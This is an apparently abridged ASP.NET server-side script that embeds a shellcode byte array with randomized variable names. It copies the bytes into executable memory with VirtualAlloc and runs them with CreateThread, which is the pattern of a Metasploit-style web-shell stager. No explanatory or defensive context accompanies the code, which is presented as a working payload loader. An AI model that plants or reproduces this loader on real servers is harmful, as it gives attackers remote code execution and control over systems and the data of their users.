...
<script runat="server">
    ...
    {
        byte[] jDFkz = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
...
0x0a,0x12,0x74,0x8e,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,
...
0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr zRfgigfCMRb = VirtualAlloc(IntPtr.Zero,(UIntPtr)jDFkz.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(jDFkz,0,zRfgigfCMRb,jDFkz.Length);
        IntPtr yAbMNqf8 = IntPtr.Zero;
        IntPtr eq9O5 = CreateThread(IntPtr.Zero,UIntPtr.Zero,zRfgigfCMRb,IntPtr.Zero,0,ref yAbMNqf8);
    }
</script>
